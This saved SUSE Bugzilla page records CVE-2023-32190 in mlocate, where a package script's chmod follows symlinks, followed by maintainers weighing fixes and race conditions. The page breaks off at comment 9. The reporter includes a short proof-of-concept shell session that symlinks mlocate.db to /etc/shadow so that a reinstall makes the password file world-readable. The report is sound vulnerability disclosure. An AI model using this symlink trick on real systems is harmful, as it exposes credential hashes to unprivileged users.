<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
                      "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en">
  <head>
    <title>1218896 &ndash; (CVE-2023-32190) VUL-0: CVE-2023-32190: mlocate: %post script allows RUN_UPDATEDB_AS user to make arbitrary files world readable</title>

      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">





    
    <link href="skins/standard/global.css?1730816923"
          rel="alternate stylesheet" 
          title="Classic"><link href="js/yui/assets/skins/sam/autocomplete.css?1730816923" rel="stylesheet"
            type="text/css" ><link href="js/yui/assets/skins/sam/calendar.css?1730816923" rel="stylesheet"
            type="text/css" ><link href="skins/standard/global.css?1730816923" rel="stylesheet"
            type="text/css" ><link href="skins/standard/bug.css?1730816923" rel="stylesheet"
            type="text/css" ><link href="extensions/Voting/web/style.css?1730816923" rel="stylesheet"
            type="text/css" >

    <link href="skins/contrib/SUSE/global.css?1730816923" rel="stylesheet"
            type="text/css" 
          title="SUSE">

    

    

    
<script type="text/javascript" src="js/yui/yahoo-dom-event/yahoo-dom-event.js?1730816923"></script><script type="text/javascript" src="js/yui/cookie/cookie-min.js?1730816923"></script><script type="text/javascript" src="js/yui/datasource/datasource-min.js?1730816923"></script><script type="text/javascript" src="js/yui/connection/connection-min.js?1730816923"></script><script type="text/javascript" src="js/yui/json/json-min.js?1730816923"></script><script type="text/javascript" src="js/yui/autocomplete/autocomplete-min.js?1730816923"></script><script type="text/javascript" src="js/yui/calendar/calendar-min.js?1730816923"></script><script type="text/javascript" src="js/global.js?1730816923"></script>

    <script type="text/javascript">
    <!--
        YAHOO.namespace('bugzilla');
        YAHOO.util.Event.addListener = function (el, sType, fn, obj, overrideContext) {
               if ( ("onpagehide" in window || YAHOO.env.ua.gecko) && sType === "unload") { sType = "pagehide"; };
               var capture = ((sType == "focusin" || sType == "focusout") && !YAHOO.env.ua.ie) ? true : false;
               return this._addListener(el, this._getType(sType), fn, obj, overrideContext, capture);
         };
        if ( "onpagehide" in window || YAHOO.env.ua.gecko) {
            YAHOO.util.Event._simpleRemove(window, "unload", 
                                           YAHOO.util.Event._unload);
        }
        
        function unhide_language_selector() { 
            YAHOO.util.Dom.removeClass(
                'lang_links_container', 'bz_default_hidden'
            ); 
        } 
        YAHOO.util.Event.onDOMReady(unhide_language_selector);

        
        var BUGZILLA = {
            param: {
                cookiepath: '\/',
                maxusermatches: 1000
            },
            constant: {
                COMMENT_COLS: 80
            },
            string: {
                

                attach_desc_required:
                    'You must enter a Description for this attachment.',
                component_required:
                    'You must select a Component for this bug.',
                description_required:
                    'You must enter a Description for this bug.',
                short_desc_required:
                    'You must enter a Summary for this bug.',
                version_required:
                    'You must select a Version for this bug.'
            }
        };

    if (history && history.replaceState) {
      if(!document.location.href.match(/show_bug\.cgi/)) {
        history.replaceState( null,
                             "1218896 – (CVE-2023-32190) VUL-0: CVE-2023-32190: mlocate: %post script allows RUN_UPDATEDB_AS user to make arbitrary files world readable",
                             "show_bug.cgi?id=1218896" );
        document.title = "1218896 – (CVE-2023-32190) VUL-0: CVE-2023-32190: mlocate: %post script allows RUN_UPDATEDB_AS user to make arbitrary files world readable";
      }
      if (document.location.href.match(/show_bug\.cgi\?.*list_id=/)) {
        var href = document.location.href;
        href = href.replace(/[\?&]+list_id=(\d+|cookie)/, '');
        history.replaceState(null, "1218896 – (CVE-2023-32190) VUL-0: CVE-2023-32190: mlocate: %post script allows RUN_UPDATEDB_AS user to make arbitrary files world readable", href);
      }
    }
    YAHOO.util.Event.onDOMReady(function() {
      initDirtyFieldTracking();

    });
    // -->
    </script>
<script type="text/javascript" src="js/util.js?1730816923"></script><script type="text/javascript" src="js/field.js?1730816923"></script>

    

    
    <link rel="search" type="application/opensearchdescription+xml"
                       title="Bugzilla" href="./search_plugin.cgi">
    <link rel="shortcut icon" href="images/favicon.ico" >
  </head>



  <body onload=""
        class="bugzilla-suse-com bz_bug bz_status_RESOLVED bz_product_SUSE_Security_Incidents bz_component_Incidents bz_bug_1218896 yui-skin-sam">



<div id="header">
<div id="banner">
  </div>

<!--div id="tmp_warning_wnd" style="
    position:fixed; 
    color:red; 
    font-size:20px; 
    top:50px; 
    left:10%; 
    right:10%; 
    padding:1em;
    background-color:#ffffff;
    border:3px solid red;
    z-index:9999;
    text-align:center;">
  This Bugzilla is for TESTING ONLY. All new bugs and comments WILL BE LOST. Use <a href="https://bugzilla.suse.com">bugzilla.suse.com</a> instead.
  <button style="
      background:none;
      border:0;
      box-shadow:none;
      color:red;
      text-shadow:none;
      position:absolute;
      right:0;
      top:0;" onclick="document.getElementById('tmp_warning_wnd').style.display='none';">[X]</button>
</div-->

<table border="0" cellspacing="0" cellpadding="0" id="titles">
<tr>
    <td id="title">
      <p>Bugzilla &ndash; Bug&nbsp;1218896</p>
    </td>

    <td id="subtitle">
      <p class="subheader">VUL-0: CVE-2023-32190: mlocate: %post script allows RUN_UPDATEDB_AS user to make arbitrary files world readable</p>
    </td>

    <td id="information">
      <p class="header_addl_info">Last modified: 2024-05-17 09:03:56 UTC</p>
    </td>
</tr>
</table>

<table id="lang_links_container" cellpadding="0" cellspacing="0"
       class="bz_default_hidden"><tr><td>
</td></tr></table>
<ul class="links">
  <li><a href="./">Home</a></li>
  <li><span class="separator">| </span><a href="enter_bug.cgi">New</a></li>
  <li><span class="separator">| </span><a href="describecomponents.cgi">Browse</a></li>
  <li><span class="separator">| </span><a href="query.cgi">Search</a></li>

  <li class="form">
    <span class="separator">| </span>
    <form action="buglist.cgi" method="get"
        onsubmit="if (this.quicksearch.value == '')
                  { alert('Please enter one or more search terms first.');
                    return false; } return true;">
    <input type="hidden" id="no_redirect_top" name="no_redirect" value="0">
    <script type="text/javascript">
      if (history && history.replaceState) {
        var no_redirect = document.getElementById("no_redirect_top");
        no_redirect.value = 1;
      }
    </script>
    <input class="txt" type="text" id="quicksearch_top" name="quicksearch" 
           title="Quick Search" value="">
    <input class="btn" type="submit" value="Search" 
           id="find_top"></form>
  <a href="page.cgi?id=quicksearch.html" title="Quicksearch Help">[?]</a></li>

  <li><span class="separator">| </span><a href="report.cgi">Reports</a></li>

  <li>
      <span class="separator">| </span>
        <a href="request.cgi">Requests</a></li>

  
    

    <li id="mini_login_containerIDP">
  <span class="separator">| </span>
  <a id="login_linkIDP" href="/saml2_login.cgi?idp=IDP&amp;target=show_bug.cgi%3Fid%3DCVE-2023-32190">IDP Log In</a>
</li>




  <li id="forgot_container_top">
    <span class="separator">| </span>
     <a id="forgot_link_top" href="https://idp-portal.suse.com/univention/self-service/#page=passwordreset">Forgot Password</a>
  </li>
</ul>
</div> 

<div id="bugzilla-body">


<script type="text/javascript">
<!--

//-->
</script>

<form name="changeform" id="changeform" method="post" action="process_bug.cgi">

  <input type="hidden" name="delta_ts" value="2024-05-17 09:03:56">
  <input type="hidden" name="id" value="1218896">
  <input type="hidden" name="token" value="1736545318-vkrQJ8Lmx5COEAN1F_J2bB6yqDJNzeFW7vINcOAPU4w">
<div class="bz_short_desc_container edit_form">
     <a href="show_bug.cgi?id=1218896"><b>Bug&nbsp;1218896</b></a> <span id="summary_container" class="bz_default_hidden">
        (<span id="alias_nonedit_display">CVE-2023-32190</span>)
      - <span id="short_desc_nonedit_display">VUL-0: CVE-2023-32190: mlocate: %post script allows RUN_UPDATEDB_AS user to make arbitrary files world readable</span></strike>
     </span>

    <div id="summary_input"><span class="field_label "
    id="field_label_short_desc">


  <a 
      title="The bug summary is a short sentence which succinctly describes what the bug is about."
      class="field_help_link"
      href="page.cgi?id=glossary.html#short_desc"
  >Summary:</a>

</span><span title="VUL-0: CVE-2023-32190: mlocate: %post script allows RUN_UPDATEDB_AS user to make arbitrary files world readable">VUL-0: CVE-2023-32190: mlocate: %post script allows RUN_UPDATEDB_AS user to m...
        </span>
    </div>
  </div>
  <script type="text/javascript">
    hideEditableField('summary_container',
                      'summary_input',
                      'summary_edit_action',
                      'short_desc',
                      'VUL-0: CVE-2023-32190: mlocate: %post script allows RUN_UPDATEDB_AS user to make arbitrary files world readable' );
  </script>
  <table class="edit_form">
    <tr>
      
      <td id="bz_show_bug_column_1" class="bz_show_bug_column">     
        <table>
          <tr>
    <th class="field_label">
      <a href="page.cgi?id=status_resolution_matrix.html">Status</a>:
    </th>
    <td id="bz_field_status">
      <span id="static_bug_status">RESOLVED
          FIXED
      </span>
    </td>
  </tr>

<tr>
    <td colspan="2" class="bz_section_spacer"></td>
  </tr>
<tr><th class="field_label "
    id="field_label_alias">


  <a 
      title="A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla."
      class="field_help_link"
      href="page.cgi?id=glossary.html#alias"
  >Alias:</a>

</th>
    <td>CVE-2023-32190
    </td>
  </tr>
<tr>
    <td colspan="2" class="bz_section_spacer"></td>
  </tr>
<tr><th class="field_label "
    id="field_label_product">


  <a 
      title="Bugs are categorised into Products and Components. Select a Classification to narrow down this list."
      class="field_help_link"
      href="describecomponents.cgi"
  >Product:</a>

</th>
  <td class="field_value "
      id="field_container_product" >SUSE Security Incidents

</td>
    </tr>

    
    <tr class="bz_default_hidden"><th class="field_label "
    id="field_label_classification">


  <a 
      title="Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation."
      class="field_help_link"
      href="page.cgi?id=glossary.html#classification"
  >Classification:</a>

</th>
  <td class="field_value "
      id="field_container_classification" >Novell Products

</td>
    </tr>
        
    
    
    <tr><th class="field_label "
    id="field_label_component">


  <a 
      title="Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list."
      class="field_help_link"
      href="describecomponents.cgi?product=SUSE Security Incidents"
  >Component:</a>

</th>
  <td class="field_value "
      id="field_container_component" >Incidents

  (<a href="buglist.cgi?component=Incidents&amp;product=SUSE%20Security%20Incidents&amp;bug_status=__open__"
      target="_blank">show other bugs</a>)
</td>
    </tr>
    <tr><th class="field_label "
    id="field_label_version">


  <a 
      title="The version field defines the version of the software the bug was found in."
      class="field_help_link"
      href="page.cgi?id=glossary.html#version"
  >Version:</a>

</th>
<td>unspecified
  </td>
    </tr>
        
    
        
    <tr><th class="field_label "
    id="field_label_rep_platform">


  <a 
      title="The hardware platform the bug was observed on. Note: When searching, selecting the option &quot;All&quot; only finds bugs whose value for this field is literally the word &quot;All&quot;."
      class="field_help_link"
      href="page.cgi?id=glossary.html#rep_platform"
  >Hardware:</a>

</th>
      <td class="field_value">Other
        Other
      </td>
    </tr>
<tr>
    <td colspan="2" class="bz_section_spacer"></td>
  </tr>

          <tr>
      <th class="field_label">
        <label  accesskey="i">
          <a href="page.cgi?id=glossary.html#priority">Priority</a></label>:
      </th>
      <td>P3 - Medium
       <label for="severity"><b>Severity</b></label>:
       Normal
      </td>
    </tr>

      <tr><th class="field_label "
    id="field_label_target_milestone">


  <a 
      title="The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it."
      class="field_help_link"
      href="page.cgi?id=glossary.html#target_milestone"
  >Target Milestone:</a>

</th><td>---
  </td>
      </tr>

          <tr><th class="field_label "
    id="field_label_assigned_to">


  <a 
      title="The person in charge of resolving the bug."
      class="field_help_link"
      href="page.cgi?id=glossary.html#assigned_to"
  >Assignee:</a>

</th>
      <td><span class="vcard"><span class="fn">Security Team bot</span>
</span>
      </td>
    </tr>

    <tr><th class="field_label "
    id="field_label_qa_contact">


  <a 
      title="The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved."
      class="field_help_link"
      href="page.cgi?id=glossary.html#qa_contact"
  >QA Contact:</a>

</th>
      <td><span class="vcard"><span class="fn">Security Team bot</span>
</span>
      </td>
    </tr>
    <script type="text/javascript">
      assignToDefaultOnChange(['product', 'component'],
        'security-team\x40suse.de',
        'security-team\x40suse.de');
    </script>
<tr>
    <td colspan="2" class="bz_section_spacer"></td>
  </tr>
<tr><th class="field_label "
    id="field_label_bug_file_loc">


  <a 
      title="Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen."
      class="field_help_link"
      href="page.cgi?id=glossary.html#bug_file_loc"
  >URL:</a>

</th>
    <td>
      <span id="bz_url_input_area">
          <a href="https://smash.suse.de/issue/391539/"
             rel="noreferrer">https://smash.suse.de/issue/391539/</a>
      </span>
    </td>
  </tr>

    <tr><th class="field_label "
    id="field_label_status_whiteboard">


  <a 
      title="Each bug has a free-form single line text entry box for adding tags and status information."
      class="field_help_link"
      href="page.cgi?id=glossary.html#status_whiteboard"
  >Whiteboard:</a>

</th><td>  
  </td>
    </tr>

    <tr><th class="field_label "
    id="field_label_keywords">


  <a 
      title="You can add keywords from a defined list to bugs, in order to easily identify and group them."
      class="field_help_link"
      href="describekeywords.cgi"
  >Keywords:</a>

</th>
  <td class="field_value "
      id="field_container_keywords" >

</td>
    </tr>
<tr>
    <td colspan="2" class="bz_section_spacer"></td>
  </tr>

          
<tr><th class="field_label "
    id="field_label_dependson">


  <a 
      title="The bugs listed here must be resolved before this bug can be resolved."
      class="field_help_link"
      href="page.cgi?id=glossary.html#dependson"
  >Depends on:</a>

</th>

  <td>

  </td>
  </tr>
  
  <tr><th class="field_label "
    id="field_label_blocked">


  <a 
      title="This bug must be resolved before the bugs listed in this field can be resolved."
      class="field_help_link"
      href="page.cgi?id=glossary.html#blocked"
  >Blocks:</a>

</th>

  <td>

  </td>
  </tr>

        </table>
      </td>
      <td>
        <div class="bz_column_spacer">&nbsp;</div>
      </td>
      
      <td id="bz_show_bug_column_2" class="bz_show_bug_column">
        <table>
        <tr>
    <th class="field_label">
      Reported:
    </th>
    <td>2024-01-17 09:09 UTC by <span class="vcard"><span class="fn">Johannes Segitz</span>
</span>
    </td>
  </tr>
  
  <tr>
    <th class="field_label">
      Modified:
    </th>
    <td>2024-05-17 09:03 UTC
      (<a href="show_activity.cgi?id=1218896">History</a>)
    </td>
  
  </tr>
<tr>
      <th class="field_label">
        <label  accesskey="a">
          CC List:
        </label>
      </th>
      <td>4 
          users
          <span id="cc_edit_area_showhide_container" class="bz_default_hidden">
            (<a href="#" id="cc_edit_area_showhide">show</a>)
          </span>
        <div id="cc_edit_area">
          <br>
            <select id="cc" multiple="multiple" size="5" >
                <option value="abergmann">abergmann</option>
                <option value="andrea.mattiazzo">andrea.mattiazzo</option>
                <option value="jdelvare">jdelvare</option>
                <option value="jsegitz">jsegitz</option>
            </select>
        </div>
          <script type="text/javascript">
            hideEditableField( 'cc_edit_area_showhide_container', 
                               'cc_edit_area', 
                               'cc_edit_area_showhide', 
                               '', 
                               '');  
          </script>
      </td>
    </tr>

<tr>
    <td colspan="2" class="bz_section_spacer"></td>
  </tr>
<tr><th class="field_label "
    id="field_label_see_also">


  <a 
      title="This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields."
      class="field_help_link"
      href="page.cgi?id=glossary.html#see_also"
  >See Also:</a>

</th>
  <td class="field_value "
      id="field_container_see_also" >

</td>
    </tr> 
<tr>
      <th class="field_label "
    id="field_label_cf_foundby">


  <a 
      title="A custom Drop Down field in this installation of Bugzilla."
      class="field_help_link"
      href="page.cgi?id=glossary.html#cf_foundby"
  >Found By:</a>

</th>
  <td class="field_value "
      id="field_container_cf_foundby" >---

</td>
    </tr>
    <tr>
      <th class="field_label "
    id="field_label_cf_nts_priority">


  <a 
      title="A custom Free Text field in this installation of Bugzilla."
      class="field_help_link"
      href="page.cgi?id=glossary.html#cf_nts_priority"
  >Services Priority:</a>

</th>
  <td class="field_value "
      id="field_container_cf_nts_priority" >

</td>
    </tr>
    <tr>
      <th class="field_label "
    id="field_label_cf_biz_priority">


  <a 
      title="A custom Free Text field in this installation of Bugzilla."
      class="field_help_link"
      href="page.cgi?id=glossary.html#cf_biz_priority"
  >Business Priority:</a>

</th>
  <td class="field_value "
      id="field_container_cf_biz_priority" >

</td>
    </tr>
    <tr>
      <th class="field_label "
    id="field_label_cf_blocker">


  <a 
      title="A custom Drop Down field in this installation of Bugzilla."
      class="field_help_link"
      href="page.cgi?id=glossary.html#cf_blocker"
  >Blocker:</a>

</th>
  <td class="field_value "
      id="field_container_cf_blocker" >---

</td>
    </tr>
    <tr>
      <th class="field_label  bz_hidden_field"
    id="field_label_cf_marketing_qa_status">


  <a 
      title="A custom Drop Down field in this installation of Bugzilla."
      class="field_help_link"
      href="page.cgi?id=glossary.html#cf_marketing_qa_status"
  >Marketing QA Status:</a>

</th>
  <td class="field_value  bz_hidden_field"
      id="field_container_cf_marketing_qa_status" >---

</td>
    </tr>
    <tr>
      <th class="field_label  bz_hidden_field"
    id="field_label_cf_it_deployment">


  <a 
      title="A custom Drop Down field in this installation of Bugzilla."
      class="field_help_link"
      href="page.cgi?id=glossary.html#cf_it_deployment"
  >IT Deployment:</a>

</th>
  <td class="field_value  bz_hidden_field"
      id="field_container_cf_it_deployment" >---

</td>
    </tr>
<tr>
    <td colspan="2" class="bz_section_spacer"></td>
  </tr>
<ul>
  <li><a href="enter_bug.cgi?cloned_bug_id=1218896">Clone This Bug</a></li>
</ul>


        </table>
      </td>
    </tr>
    <tr>
      <td colspan="3">
          <hr id="bz_top_half_spacer">
      </td>
    </tr>
  </table>

  <table id="bz_big_form_parts">
  <tr>
  <td>

    
<script type="text/javascript">
<!--
function toggle_display(link) {
    var table = document.getElementById("attachment_table");
    var view_all = document.getElementById("view_all");
    var hide_obsolete_url_parameter = "&hide_obsolete=1";
    // Store current height for scrolling later
    var originalHeight = table.offsetHeight;
    var rows = YAHOO.util.Dom.getElementsByClassName(
        'bz_tr_obsolete', 'tr', table);

    for (var i = 0; i < rows.length; i++) {
        bz_toggleClass(rows[i], 'bz_default_hidden');
    }

    if (YAHOO.util.Dom.hasClass(rows[0], 'bz_default_hidden')) {
        link.innerHTML = "Show Obsolete";
        view_all.href = view_all.href + hide_obsolete_url_parameter 
    }
    else {
        link.innerHTML = "Hide Obsolete";
        view_all.href = view_all.href.replace(hide_obsolete_url_parameter,"");
    }

    var newHeight = table.offsetHeight;
    // This scrolling makes the window appear to not move at all.
    window.scrollBy(0, newHeight - originalHeight);

    return false;
}
//-->
</script>

<br>
<table id="attachment_table">
  <tr id="a0">
    <th colspan="2" class="left">
      Attachments
    </th>
  </tr>



  <tr class="bz_attach_footer">
    <td colspan="2">
        <a href="attachment.cgi?bugid=1218896&amp;action=enter">Add an attachment</a>
        (proposed patch, testcase, etc.)
    </td>
  </tr>
</table>
<br>
<div id="add_comment" class="bz_section_additional_comments">
      <table>
        <tr>
          <td>
            <fieldset>
              <legend>Note</legend>
              You need to
              <a href="show_bug.cgi?id=1218896&amp;GoAheadAndLogIn=1">log in</a>
              before you can comment on or make changes to this bug.
            </fieldset>
          </td>
        </tr> 
      </table>
  </div>
  </td>
  <td>
  </td>
  </tr></table>

  
  <div id="comments"><script src="js/comments.js?1730816923" type="text/javascript">
</script>

<script type="text/javascript">
<!--
  /* Adds the reply text to the `comment' textarea */
  function replyToComment(id, real_id, name) {
      var prefix = "(In reply to " + name + " from comment #" + id + ")\n";
      var replytext = "";
        /* pre id="comment_name_N" */
        var text_elem = document.getElementById('comment_text_'+id);
        var text = getText(text_elem);
        replytext = prefix + wrapReplyText(text);


      /* <textarea id="comment"> */
      var textarea = document.getElementById('comment');
      if (textarea.value != replytext) {
          textarea.value += replytext;
      }

      textarea.focus();
  } 
//-->
</script>




<!-- This auto-sizes the comments and positions the collapse/expand links 
     to the right. -->
<table class="bz_comment_table" cellpadding="0" cellspacing="0"><tr>
<td>
<div id="c0" class="bz_comment bz_first_comment">

      <div class="bz_first_comment_head">



        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=1218896#c0">Description</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Johannes Segitz</span>
</span>
        </span>

        <span class="bz_comment_time">
          2024-01-17 09:09:45 UTC
        </span>
      </div>



<pre class="bz_comment_text" >After installation:

ls -la /var/lib/mlocate
total 4300
drwxr-xr-x 1 root   root   ?      20 Jan 17 09:55 .
drwxr-xr-x 1 root   root   ?     798 Jan 17 09:54 ..
-rw-r--r-- 1 root   root   ? 4399330 Jan 17 09:55 mlocate.db

Start mlocate: systemctl start mlocate

Now:
ls -la /var/lib/mlocate
total 4300
drwxr-xr-x 1 nobody root   ?      20 Jan 17 09:55 .
drwxr-xr-x 1 root   root   ?     798 Jan 17 09:54 ..
-rw-r--r-- 1 nobody nobody ? 4399330 Jan 17 09:55 mlocate.db

Since this is the service (/usr/lib/systemd/system/mlocate.service):
 19 ExecStart=/bin/sh -c \
 20           &quot;chown -R ${RUN_UPDATEDB_AS}:root /var/lib/mlocate &amp;&amp; \
 21           su --shell=/bin/sh ${RUN_UPDATEDB_AS} -c 'umask 0022; /usr/bin/updatedb'&quot;

Now this %post part of mlocate.spec
111 # If database permissions are wrong (see <a href="http://bugzilla.suse.com/show_bug.cgi?id=1188933">bsc#1188933</a>), fix them
112 if [ -f &quot;%{_localstatedir}/lib/mlocate/mlocate.db&quot; ]
113 then
114         chmod 644 &quot;%{_localstatedir}/lib/mlocate/mlocate.db&quot;
115 fi

turns into a way to make arbitrary files world readable for ${RUN_UPDATEDB_AS}

POC:
nobody&#64;localhost:/var/lib/mlocate&gt; ls -la /etc/shadow
-rw-r----- 1 root shadow 982 Nov 16 10:13 /etc/shadow
nobody&#64;localhost:/var/lib/mlocate&gt; id
uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
nobody&#64;localhost:/var/lib/mlocate&gt; ls -lah
total 4.2M
drwxr-xr-x 1 nobody root     20 Jan 17 09:55 .
drwxr-xr-x 1 root   root    798 Jan 17 09:54 ..
-rw-r--r-- 1 nobody nobody 4.2M Jan 17 09:55 mlocate.db
nobody&#64;localhost:/var/lib/mlocate&gt; mv mlocate.db mlocate.db_bak
nobody&#64;localhost:/var/lib/mlocate&gt; ln -s /etc/shadow mlocate.db
nobody&#64;localhost:/var/lib/mlocate&gt; ls -lah
total 4.3M
drwxr-xr-x 1 nobody root     48 Jan 17 09:59 .
drwxr-xr-x 1 root   root    798 Jan 17 09:54 ..
lrwxrwxrwx 1 nobody nobody   11 Jan 17 09:59 mlocate.db -&gt; /etc/shadow
-rw-r--r-- 1 nobody nobody 4.2M Jan 17 09:55 mlocate.db_bak

Now as root simulate that mlocate gets updated with: zypper in -f mlocate

nobody&#64;localhost:/var/lib/mlocate&gt; ls -la /etc/shadow
-rw-r--r-- 1 root shadow 1172 Dec  5 16:48 /etc/shadow

Present since 2023-12-13.

If a directory is owned by a user you must take great care when operating in this directory as root. Either remove the chmod or change ownership of /var/lib/mlocate to root before operating in there (you can change it back afterwards, but the service does that already)</pre>
    </div><div id="c1" class="bz_comment">

      <div class="bz_comment_head">



        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=1218896#c1">Comment 1</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Johannes Segitz</span>
</span>
        </span>

        <span class="bz_comment_time">
          2024-01-17 09:10:29 UTC
        </span>
      </div>



<pre class="bz_comment_text" >This is an embargoed bug. This means that this information is not public.

Please do NOT:
- talk to other people about this unless they're involved in fixing the issue
- make this bug public
- submit this into OBS (e.g. fix Leap/Tumbleweed) until this bug becomes
  public. This means that the security team removed the EMBARGOED tag from
  the bug title after we verified that there's already information about
  this bug publicly available. If you find such information yourself and
  the bug is still embargoed please contact us

Your primary responsibility is to apply a fix for this issue.
Here is some guidance on openSUSE package maintenance:
- <a href="https://en.opensuse.org/openSUSE:Package_maintenance">https://en.opensuse.org/openSUSE:Package_maintenance</a>
- <a href="https://en.opensuse.org/openSUSE:Maintenance_update_process">https://en.opensuse.org/openSUSE:Maintenance_update_process</a>

You need to submit AFTER the bug became public, to the current openSUSE
Leap codestreams, and to the devel project of your package.

The security team will then take the following steps:
- We wait for your submission and package them into an incident for QA
  testing. The QA tester might reach out to you if they find issues with
  the update.
- If QA doesn't find any issues, we publish the updates.

You can contact us at:

* IRC: irc.suse.de #security
* Do NOT use Slack or any non-SUSE hosted messaging services
* Email: <a href="mailto:security-team&#64;suse.de">security-team&#64;suse.de</a></pre>
    </div><div id="c2" class="bz_comment">

      <div class="bz_comment_head">



        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=1218896#c2">Comment 2</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Johannes Segitz</span>
</span>
        </span>

        <span class="bz_comment_time">
          2024-01-17 09:10:54 UTC
        </span>
      </div>



<pre class="bz_comment_text" >Internal CRD: 2024-02-16 or earlier</pre>
    </div><div id="c3" class="bz_comment">

      <div class="bz_comment_head">



        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=1218896#c3">Comment 3</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Jean Delvare</span>
</span>
        </span>

        <span class="bz_comment_time">
          2024-01-17 13:29:05 UTC
        </span>
      </div>



<pre class="bz_comment_text" >The chmod was added to fix a bug. Removing it would reintroduce the bug, so it's obviously not desirable.

Your POC implies acting as &quot;nobody&quot;, however my understanding is that logging as this user isn't possible. The only way would be to su to that user from the root account. But if the attacker has already gained access to the root account then exploiting this bug is not longer needed.

So I think the chmod is only an issue if the attacker has already exploited another bug in some service running as ${RUN_UPDATEDB_AS} to be able to perform arbitrary actions as that user?</pre>
    </div><div id="c4" class="bz_comment">

      <div class="bz_comment_head">



        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=1218896#c4">Comment 4</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Alexander Bergmann</span>
</span>
        </span>

        <span class="bz_comment_time">
          2024-01-17 14:32:10 UTC
        </span>
      </div>



<pre class="bz_comment_text" >So far the fix for <a href="http://bugzilla.suse.com/show_bug.cgi?id=1188933">bsc#1188933</a> was only pushed into Factory.

However, there are customer PTFs and pending maintenance update requests (SUSE/openSUSE).</pre>
    </div><div id="c5" class="bz_comment">

      <div class="bz_comment_head">



        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=1218896#c5">Comment 5</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Alexander Bergmann</span>
</span>
        </span>

        <span class="bz_comment_time">
          2024-01-17 16:27:14 UTC
        </span>
      </div>



<pre class="bz_comment_text" >In this case a symbolic link is considered a &quot;regular file&quot;. That's the reason why the test case 'if [ -f &quot;.../mlocate.db&quot; ]' is true and executes the 'chmod 644' command.

What we could do here is to check explicitly for a symbolic links. The bash has the test case '-h' or '-L' for checking this.

       -h file
              True if file exists and is a symbolic link.
       -L file
              True if file exists and is a symbolic link.

111 # If database permissions are wrong (see <a href="http://bugzilla.suse.com/show_bug.cgi?id=1188933">bsc#1188933</a>), fix them
112 if [[ -f &quot;%{_localstatedir}/lib/mlocate/mlocate.db&quot; &amp;&amp;
113       ! -h &quot;%{_localstatedir}/lib/mlocate/mlocate.db&quot; ]]
114 then
115         chmod 644 &quot;%{_localstatedir}/lib/mlocate/mlocate.db&quot;
116 fi

There is currently no switch for 'chmod' to prevent the &quot;follow symlink&quot; issue directly.</pre>
    </div><div id="c6" class="bz_comment">

      <div class="bz_comment_head">



        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=1218896#c6">Comment 6</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Jean Delvare</span>
</span>
        </span>

        <span class="bz_comment_time">
          2024-01-17 17:13:26 UTC
        </span>
      </div>



<pre class="bz_comment_text" >We could do that, but that would be racy. The symlink could be created between the test and the call to chmod.

<span class="quote">&gt; There is currently no switch for 'chmod' to prevent the &quot;follow symlink&quot;
&gt; issue directly.</span >

That's the first thing I looked for, but indeed, unfortunately, it doesn't exist. It might be worth implementing, for future use cases if not for this bug. FWIW, BSD's chmod has option -h which changes the mode of the link itself instead of following it. I don't think Linux allows the mode of symbolic links to be anything other than 777.</pre>
    </div><div id="c7" class="bz_comment">

      <div class="bz_comment_head">



        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=1218896#c7">Comment 7</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Johannes Segitz</span>
</span>
        </span>

        <span class="bz_comment_time">
          2024-01-18 08:33:27 UTC
        </span>
      </div>



<pre class="bz_comment_text" >(In reply to Jean Delvare from <a href="show_bug.cgi?id=1218896#c3">comment #3</a>)
yes, this allows escalation of privileges from nobody. For the attack someone else needs to have a way to act as nobody. But as this user is used sometimes as a &quot;sandboxing&quot; mechanism this is reasonable. Nobody must not be able to gain root privileges.

(In reply to Jean Delvare from <a href="show_bug.cgi?id=1218896#c6">comment #6</a>)
it is indeed racy. Changing the directory owner before running chmod is safe and since this only happens during updates shouldn't cause issues. After the chmod run the directory ownership can be changed back

And yes, having -h for chmod would be handy. I'll check if I can submit this</pre>
    </div><div id="c8" class="bz_comment">

      <div class="bz_comment_head">



        <span class="bz_comment_number">
          <a 
             href="show_bug.cgi?id=1218896#c8">Comment 8</a>
        </span>

        <span class="bz_comment_user">
          <span class="vcard"><span class="fn">Jean Delvare</span>
</span>
        </span>

        <span class="bz_comment_time">
          2024-01-18 12:11:15 UTC
        </span>
      </div>



<pre class="bz_comment_text" >I can't see how changing the directory owner alone would solve the problem. Presumably the attacker has created the symlink already, so it's too late, changing the directory owner won't prevent the symlink from being followed by chmod.

Changing the directory would only help prevent the race mentioned in <a href="show_bug.cgi?id=1218896#c6">comment #6</a>. So we would change the owner of the directory to root and then check that mlocate.db isn't a symlink before calling chmod.

However this solution introduces another race condition: if the mlocate database update service is running while we are doing that, and RUN_UPDATEDB_AS is set to nobody, there is a risk that the update fails because it can't write the file to the now root-owned directory.</pre>
    </div><div id="c9" class="bz_comment">

